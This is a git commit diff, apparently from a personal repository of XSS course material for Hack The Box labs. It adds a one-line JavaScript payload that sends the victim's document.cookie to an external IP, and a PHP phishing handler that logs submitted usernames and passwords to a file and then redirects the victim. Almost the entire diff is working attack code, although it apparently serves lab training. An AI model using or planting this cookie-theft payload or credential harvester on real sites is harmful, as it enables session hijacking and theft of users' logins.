e02cb4778966d0f2bb5134a9bdf28ca055343da2
trop3n <jasondkimm@proton.me>
2025-05-17 21:55:05 -0500

    added tools and examples from XSS course

---
+++ htb/script.js
@@ -0,0 +1,1 @@
+new Image().src='http://10.10.14.39:8080/index.php?c='+document.cookie;
---
+++ index.php
@@ -0,0 +1,9 @@
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://10.129.255.204/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
